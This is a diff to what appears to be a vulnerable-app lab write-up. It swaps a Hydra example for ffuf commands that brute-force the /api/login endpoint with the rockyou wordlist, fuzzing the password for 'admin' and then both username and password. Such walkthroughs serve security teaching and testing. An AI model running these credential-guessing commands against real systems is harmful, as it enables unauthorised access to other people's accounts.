@@ -18,12 +18,30 @@ The login functionality is implemented in `src/pages/api/login.ts`. Review the c
 
 ## Exploitation Steps
 
-1. **Brute Force Attack**: 
-   Use a tool like `Hydra` or `Burp Suite` to perform a brute force attack on the login endpoint. The endpoint is located at `/api/login`.
+1. **Brute Force Attack with ffuf**: 
+   Use `ffuf` to brute force the login endpoint at `/api/login`:
 
-   Example command using Hydra:
+   ```bash
+   ffuf -u http://<target-ip>:3010/api/login \
+     -X POST \
+     -H "Content-Type: application/json" \
+     -d '{"username":"admin","password":"FUZZ"}' \
+     -w /usr/share/wordlists/rockyou.txt \
+     -fc 401
    ```
-   hydra -l <username> -P <path_to_password_list> http://<target_ip>/api/login
+
+   > **Tip:** `-fc 401` filters out failed attempts (401 Unauthorized), so only successful logins are shown.
+
+   You can also try other usernames:
+   ```bash
+   # Fuzz both username and password
+   ffuf -u http://<target-ip>:3010/api/login \
+     -X POST \
+     -H "Content-Type: application/json" \
+     -d '{"username":"FUZZ","password":"FUZZ2"}' \
+     -w /usr/share/wordlists/common-users.txt:FUZZ \
+     -w /usr/share/wordlists/rockyou.txt:FUZZ2 \
+     -fc 401
    ```
 
 2. **Session Fixation**:
